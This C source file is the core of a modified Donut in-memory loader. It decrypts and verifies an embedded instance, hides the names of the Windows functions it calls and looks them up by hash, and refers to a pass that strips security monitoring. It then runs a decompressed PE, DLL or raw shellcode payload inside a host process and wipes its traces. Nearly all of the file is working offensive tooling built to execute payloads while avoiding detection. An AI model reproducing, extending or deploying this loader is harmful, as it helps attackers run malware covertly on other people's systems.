/**
  BSD 3-Clause License

  Copyright (c) 2019, TheWover, Odzhan. All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are met:

  * Redistributions of source code must retain the above copyright notice, this
    list of conditions and the following disclaimer.

  * Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

  * Neither the name of the copyright holder nor the names of its
    contributors may be used to endorse or promote products derived from
    this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
  OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

#include "loader.h"
#include "homer_kdf.h"

DWORD MainProc(PDONUT_INSTANCE inst);


void DonutLoader(PDONUT_INSTANCE inst) {
    DPRINT("DonutLoader entered");

    // --- Homer bootstrap (layers 4/5) ---
    {
      uint8_t  boot_key[16];
      uint32_t boot_len;
      uint64_t boot_iv;
      LPVOID   pv;
      uint8_t  *inst_data;
      NtAllocateVirtualMemory_t _va;
      NtFreeVirtualMemory_t  _vf;
      char _d[16], _a[32], _f[32];

      _d[0]='n';_d[1]='t';_d[2]='d';_d[3]='l';_d[4]='l';_d[5]='.';
      _d[6]='d';_d[7]='l';_d[8]='l';_d[9]=0;
      {
        const char *_s="NtAllocateVirtualMemory"; int _i;
        for(_i=0;_s[_i];_i++) _a[_i]=_s[_i]; _a[_i]=0;
      }
      {
        const char *_s="NtFreeVirtualMemory"; int _i;
        for(_i=0;_s[_i];_i++) _f[_i]=_s[_i]; _f[_i]=0;
      }

      memcpy(&boot_len, &inst->len, sizeof(boot_len));
      homer_mask_xor((uint8_t*)&boot_len, sizeof(boot_len), HOMER_KDF_LEN);
      memcpy(&boot_iv, &inst->iv, sizeof(boot_iv));
      homer_mask_xor((uint8_t*)&boot_iv, sizeof(boot_iv), HOMER_KDF_IV);
      memcpy(boot_key, inst->key.mk, 16);
      homer_mask_xor(boot_key, 16, HOMER_KDF_MK);

      DPRINT("unmask done, boot_len=%u", boot_len);

      _va = (NtAllocateVirtualMemory_t)homer_get_proc(_d, _a);
      DPRINT("homer_get_proc VirtualAlloc: %p", (LPVOID)_va);
      if(_va == NULL) return;
      {
        PVOID _base = NULL; SIZE_T _sz = boot_len;
        _va((HANDLE)-1, &_base, 0, &_sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        pv = _base;
      }
      DPRINT("pv after alloc: %p", pv);
      if(pv == NULL) return;
      Memcpy(pv, inst, boot_len);
      inst = (PDONUT_INSTANCE)pv;

      inst->len = boot_len;
      inst->iv  = boot_iv;
      memcpy(inst->key.mk, boot_key, 16);

      {
        uint8_t *inst_data = (uint8_t*)inst + offsetof(DONUT_INSTANCE, api_cnt);
        donut_decrypt(boot_key, inst->key.ctr, inst_data,
                      inst->len - offsetof(DONUT_INSTANCE, api_cnt));
      }

      if(maru(inst->sig, inst->iv) != inst->mac) {
        Memset(inst, 0, inst->len);
        _vf = (NtFreeVirtualMemory_t)homer_get_proc(_d, _f);
        if(_vf != NULL) {
          PVOID _b = inst; SIZE_T _s = 0;
          _vf((HANDLE)-1, &_b, &_s, MEM_RELEASE);
        }
        return;
      }
    }

    DPRINT("after bootstrap: api_cnt=%u", inst->api_cnt);

    // The loader always runs the payload in the existing thread and
    // returns: abandoning this frame for the host entrypoint would never
    // come back.
    MainProc(inst);
}

DWORD MainProc(PDONUT_INSTANCE inst) {
    ULONG                i, ofs, wspace, fspace, len;
    ULONG64              sig;
    PDONUT_MODULE        mod, unpck;
    NtAllocateVirtualMemory_t  _NtAllocateVirtualMemory;
    NtFreeVirtualMemory_t      _NtFreeVirtualMemory;
    NtTerminateProcess_t _NtTerminateUserProcess;
    LPVOID               pv;
    ULONG64              hash;
    BOOL                 term;
    NTSTATUS             nts;
    PCHAR                str;
    CHAR                 path[MAX_PATH];
    
    DPRINT("Maru IV : %" PRIX64, inst->iv);
    
    hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.NtAllocateVirtualMemory) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
    DPRINT("Resolving address for VirtualAlloc() : %" PRIX64, hash);
    _NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)xGetProcAddressByHash(inst, hash, inst->iv);
    
    hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.NtFreeVirtualMemory) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
    DPRINT("Resolving address for VirtualFree() : %" PRIX64, hash);
    _NtFreeVirtualMemory  = (NtFreeVirtualMemory_t) xGetProcAddressByHash(inst, hash,  inst->iv);
    
    hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.NtTerminateProcess) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
    DPRINT("Resolving address for RtlExitUserProcess() : %" PRIX64, hash);
    _NtTerminateUserProcess  = (NtTerminateProcess_t) xGetProcAddressByHash(inst, hash,  inst->iv);
    
    if(_NtAllocateVirtualMemory == NULL || 
       _NtFreeVirtualMemory        == NULL || 
       _NtTerminateUserProcess == NULL) 
    {
      DPRINT("FAILED!.");
      return -1;
    }
    
    DPRINT("NtAllocateVirtualMemory : %p NtFreeVirtualMemory : %p", 
      (LPVOID)_NtAllocateVirtualMemory, (LPVOID)_NtFreeVirtualMemory);
    
    DPRINT("Allocating %i bytes of RW memory", inst->len);
    PVOID _pv = NULL;
    SIZE_T _sz = inst->len;
    _NtAllocateVirtualMemory((HANDLE)-1, &_pv, 0, &_sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    pv = _pv;
    
    if(pv == NULL) {
      DPRINT("Memory allocation failed...");
        if(inst->exit_opt == DONUT_OPT_EXIT_PROCESS) {
        DPRINT("Terminating host process");
        _NtTerminateUserProcess((HANDLE)-1, 0);
      }
      return -1;
    }
    DPRINT("Copying %i bytes of data to memory %p", inst->len, pv);
    Memcpy(pv, inst, inst->len);
    inst = (PDONUT_INSTANCE)pv;

    // Operator passes run before any loader API is resolved. The stock
    // unhook pass lives in passes/unhook.c, not here; an empty pass set
    // is a plain load.
    if (homer_run_passes(HOMER_PRE_MAP, inst, NULL, NULL, NULL) != 0) return -1;

    
    inst->api.addr[0] = xGetProcAddressByHash(inst, inst->api.hash[0], inst->iv);
    if(inst->api.addr[0] == NULL) return -1;
    
    str = (PCHAR)inst->dll_names;
    
    for(;;) {
      for(i=0; str[i] != '\0' && str[i] !=';' && i<MAX_PATH; i++) path[i] = str[i];
      if(i == 0) break;
      str += (i + 1);
      path[i] = '\0';
      xGetLibAddress(inst, path);
    }
    
    
    for(i=1; i<inst->api_cnt; i++) {
      DPRINT("Resolving API %d : %016llX", i, inst->api.hash[i]);
        
      inst->api.addr[i] = xGetProcAddressByHash(inst, inst->api.hash[i], inst->iv);
      
      if(inst->api.addr[i] == NULL) {
        DPRINT("Failed to resolve an API");
        goto erase_memory;
      }
    }
    
    mod = (PDONUT_MODULE)&inst->module.x;
    
    if(mod->compress != DONUT_COMPRESS_NONE) {
      DPRINT("Compression engine is %"PRIx32, mod->compress);
      
      DPRINT("Allocating %zd bytes of memory for decompressed file and module information", 
        mod->len + sizeof(DONUT_MODULE));
      
      {
        PVOID _base = NULL;
        SIZE_T _sz = ((sizeof(DONUT_MODULE) + mod->len) + 4095) & -4096;
        if(_NtAllocateVirtualMemory((HANDLE)-1, &_base, 0, &_sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) == 0)
          unpck = (PDONUT_MODULE)_base;
        else
          unpck = NULL;
      }
        
      if(unpck == NULL) goto erase_memory;
      
      DPRINT("Duplicating DONUT_MODULE");
      Memcpy(unpck, mod, sizeof(DONUT_MODULE));
      
      DPRINT("Decompressing %"PRId32 " -> %"PRId32, mod->zlen, mod->len);
      
      if(mod->compress == DONUT_COMPRESS_LZNT1  ||
         mod->compress == DONUT_COMPRESS_XPRESS)
      {
        DPRINT("Decompressing with RtlDecompressBuffer(%s)",
          mod->compress == DONUT_COMPRESS_LZNT1 ? "LZNT" : "XPRESS");
                
        nts = inst->api.RtlDecompressBuffer(
              (mod->compress - 1) | COMPRESSION_ENGINE_MAXIMUM, 
              (PUCHAR)unpck->data, mod->len, 
              (PUCHAR)&mod->data, mod->zlen, &len);
              
        if(nts == 0) {
            mod = unpck;
        } else {
          DPRINT("RtlDecompressBuffer failed with %"PRIX32, nts);
          goto erase_memory;
        }
      } else if(mod->compress == DONUT_COMPRESS_APLIB) {
        // Unsupported engine: the generator refuses it, and a foreign
        // instance carrying one is not executed.
        DPRINT("aPLib compression is not supported");
        goto erase_memory;
      }
    }
    
    if(mod->type == DONUT_MODULE_DLL ||
       mod->type == DONUT_MODULE_EXE) {
      RunPE(inst, mod);
    } else
    if(mod->type == DONUT_MODULE_SC)
    {
      RunShellcode(inst, mod);
    } else
    {
      // Only unmanaged PE and raw shellcode have a loader. The generator
      // refuses anything else; a foreign instance carrying one is not executed.
      DPRINT("Unsupported module type %"PRId32, mod->type);
      goto erase_memory;
    }

    // Block forever instead of exiting, on request.
    if (inst->exit_opt == DONUT_OPT_EXIT_BLOCK) {
      DPRINT("Execution complete. Blocking indefintely.");
      for (;;) { __asm__ volatile("pause"); }
    }
    
erase_memory:
    term = (BOOL) (inst->exit_opt == DONUT_OPT_EXIT_PROCESS);
    
    DPRINT("Erasing RW memory for instance");
    Memset(inst, 0, inst->len);
    
    DPRINT("Releasing RW memory for instance");
    {
      PVOID _base = inst;
      SIZE_T _sz = 0;
      _NtFreeVirtualMemory((HANDLE)-1, &_base, &_sz, MEM_RELEASE);
    }
    
    if(term) {
      DPRINT("Terminating host process");
        _NtTerminateUserProcess((HANDLE)-1, 0);
    }
    return 0;
}

int ansi2unicode(PDONUT_INSTANCE inst, CHAR input[], WCHAR output[DONUT_MAX_NAME]) {
    int len = 0, out = 0;
    while (input[len] && out < DONUT_MAX_NAME - 1) {
        output[out++] = (WCHAR)(unsigned char)input[len++];
    }
    output[out] = 0;
    return out;
}

#include "peb.c"             // resolve functions in export table
#include "ldrentry.c"        // PEB LDR entry for the mapped payload
#include "inmem_pe.c"        // Unmanaged PE/DLL files
#include "shellcode.c"        // raw shellcode payloads

#include "getpc.c"           // code stub to return program counter (always at the end!)
